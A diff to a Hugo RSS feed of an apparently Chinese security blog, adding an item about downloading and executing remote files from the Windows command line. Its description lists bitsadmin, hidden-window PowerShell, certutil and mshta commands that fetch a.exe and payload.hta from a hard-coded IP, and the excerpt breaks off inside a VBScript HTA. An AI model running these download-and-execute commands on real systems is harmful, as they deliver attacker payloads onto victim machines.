@@ -7,10 +7,22 @@
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
     <copyright>Copyright &amp;copy; 2016-2017 Reber. All Rights Reserved.</copyright>
-    <lastBuildDate>Mon, 29 Jan 2018 16:45:34 +0800</lastBuildDate>
+    <lastBuildDate>Tue, 06 Feb 2018 15:12:32 +0800</lastBuildDate>
     
 	<atom:link href="http://wyb0.com/index.xml" rel="self" type="application/rss+xml" />
     
+    
+    <item>
+      <title>Windows终端下载文件和执行远程文件</title>
+      <link>http://wyb0.com/posts/win-terminal-download-and-exec-remote-file/</link>
+      <pubDate>Tue, 06 Feb 2018 15:12:32 +0800</pubDate>
+      
+      <guid>http://wyb0.com/posts/win-terminal-download-and-exec-remote-file/</guid>
+      <description>0x00 bitsadmin下载文件 win2008
+bitsadmin /rawreturn /transfer getfile http://114.115.214.203/a.exe C:\Windows\Temp\a.exe bitsadmin /rawreturn /transfer getpayload 114.115.214.203/a.zip C:\Windows\Temp\a.zip bitsadmin /transfer myDownLoadJob /download /priority normal &amp;quot;http://114.115.214.203/a.exe&amp;quot; &amp;quot;C:\Windows\Temp\a.exe&amp;quot;  0x01 powershell下载文件 win2008
+powershell (new-object System.Net.WebClient).DownloadFile(&amp;quot;http://114.115.214.203/a.exe&amp;quot;,&amp;quot;C:\Windows\Temp\a.exe&amp;quot;) #-w hidden 下载后终端自动退出 powershell -w hidden -c (new-object System.Net.WebClient).DownloadFile(&amp;quot;http://114.115.214.203/a.exe&amp;quot;,&amp;quot;C:\Windows\Temp\a.exe&amp;quot;)  0x02 certutil下载文件 certutil -urlcache -split -f http://114.115.214.203/test.txt test.txt certutil -urlcache -split -f http://114.115.214.203/a.exe a.exe  0x03 mshta执行远程hta mshta http://114.115.214.203/payload.hta  payload.hta
+&amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html lang=&amp;quot;en&amp;quot;&amp;gt; &amp;lt;head&amp;gt; &amp;lt;meta charset=&amp;quot;UTF-8&amp;quot;&amp;gt; &amp;lt;script language=&amp;quot;VBScript&amp;quot;&amp;gt; Window.</description>
+    </item>
     
     <item>
       <title>Python中执行系统命令</title>
